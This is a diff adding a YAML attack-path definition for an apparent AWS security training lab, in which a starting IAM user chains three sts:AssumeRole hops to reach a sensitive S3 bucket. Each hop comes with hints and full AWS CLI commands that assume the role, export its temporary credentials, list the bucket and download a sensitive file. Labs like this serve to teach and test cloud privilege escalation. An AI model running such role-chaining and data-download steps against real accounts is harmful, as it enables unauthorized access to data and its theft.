@@ -1,0 +1,145 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-pathfinding-starting-user-prod"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has minimal permissions but can call sts:AssumeRole to begin
+        traversing a three-hop role chain that ultimately reaches full S3 access on
+        the sensitive destination bucket.
+
+    - id: initial-role
+      label: "Initial Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-initial-role"
+      description: >
+        This is the first hop in the role chain. The role trusts any principal in
+        the prod account that has sts:AssumeRole permission, making it broadly
+        accessible. It has no sensitive permissions of its own but can assume
+        the intermediate role.
+
+    - id: intermediate-role
+      label: "Intermediate Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-intermediate-role"
+      description: >
+        This is the second hop in the role chain. It is trusted by both the initial
+        role and by a dedicated IAM user (pl-prod-role-chain-user), creating two
+        distinct paths to this point. It can assume the S3 access role.
+
+    - id: s3-access-role
+      label: "S3 Access Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-s3-access-role"
+      description: >
+        This is the third and final hop in the role chain. It holds broad S3
+        permissions (s3:GetObject, s3:PutObject, s3:DeleteObject, s3:ListBucket)
+        scoped to the sensitive destination bucket. Assuming this role grants full
+        read/write access to the bucket contents.
+
+    - id: target-bucket
+      label: "Sensitive S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-prod-role-chain-destination-{account_id}"
+      description: >
+        The destination S3 bucket containing sensitive data. It is only accessible
+        via pl-prod-s3-access-role, which is only reachable by traversing the full
+        three-hop role chain from the starting user.
+
+  edges:
+    - from: starting-user
+      to: initial-role
+      label: "sts:AssumeRole"
+      description: >
+        The starting user assumes pl-prod-initial-role. The role's trust policy
+        allows any principal in the prod account with sts:AssumeRole permission
+        to assume it.
+      hints:
+        - "You can assume roles. Look for roles that trust your principal."
+        - "Check what roles are available in the account and inspect their trust policies."
+        - "There is a chain of roles, each trusting the previous. Follow the chain to its end."
+        - "Browse to https://pathfinding.cloud/paths/role-chain-to-s3 for technique details."
+      commands:
+        - description: "Assume the initial role (Hop 1)"
+          command: |
+            INITIAL_CREDS=$(aws sts assume-role \
+              --role-arn "arn:aws:iam::{account_id}:role/pl-prod-initial-role" \
+              --role-session-name "hop1" \
+              --output json)
+            export AWS_ACCESS_KEY_ID=$(echo $INITIAL_CREDS | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo $INITIAL_CREDS | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo $INITIAL_CREDS | jq -r '.Credentials.SessionToken')
+        - description: "Verify identity as the initial role"
+          command: "aws sts get-caller-identity"
+
+    - from: initial-role
+      to: intermediate-role
+      label: "sts:AssumeRole"
+      description: >
+        The initial role assumes pl-prod-intermediate-role. The intermediate role's
+        trust policy explicitly allows pl-prod-initial-role to assume it.
+      hints:
+        - "This role can assume the next role in the chain."
+        - "Look at this role's permission policies for sts:AssumeRole grants."
+      commands:
+        - description: "Assume the intermediate role (Hop 2)"
+          command: |
+            INTERMEDIATE_CREDS=$(aws sts assume-role \
+              --role-arn "arn:aws:iam::{account_id}:role/pl-prod-intermediate-role" \
+              --role-session-name "hop2" \
+              --output json)
+            export AWS_ACCESS_KEY_ID=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo $INTERMEDIATE_CREDS | jq -r '.Credentials.SessionToken')
+        - description: "Verify identity as the intermediate role"
+          command: "aws sts get-caller-identity"
+
+    - from: intermediate-role
+      to: s3-access-role
+      label: "sts:AssumeRole"
+      description: >
+        The intermediate role assumes pl-prod-s3-access-role. The S3 access role's
+        trust policy explicitly allows pl-prod-intermediate-role to assume it.
+      hints:
+        - "This role is reachable via two different paths."
+        - "Check which role this one can assume next."
+      commands:
+        - description: "Assume the S3 access role (Hop 3)"
+          command: |
+            S3_CREDS=$(aws sts assume-role \
+              --role-arn "arn:aws:iam::{account_id}:role/pl-prod-s3-access-role" \
+              --role-session-name "hop3" \
+              --output json)
+            export AWS_ACCESS_KEY_ID=$(echo $S3_CREDS | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo $S3_CREDS | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo $S3_CREDS | jq -r '.Credentials.SessionToken')
+        - description: "Verify identity as the S3 access role"
+          command: "aws sts get-caller-identity"
+
+    - from: s3-access-role
+      to: target-bucket
+      label: "s3:GetObject, s3:ListBucket"
+      description: >
+        The S3 access role reads from and lists the sensitive destination bucket,
+        confirming full data access at the end of the role chain.
+      hints:
+        - "This role has direct S3 permissions on the target bucket."
+      commands:
+        - description: "List bucket contents"
+          command: "aws s3 ls s3://pl-prod-role-chain-destination-{account_id}/"
+        - description: "Download a sensitive file"
+          command: "aws s3 cp s3://pl-prod-role-chain-destination-{account_id}/sensitive-data.txt ."
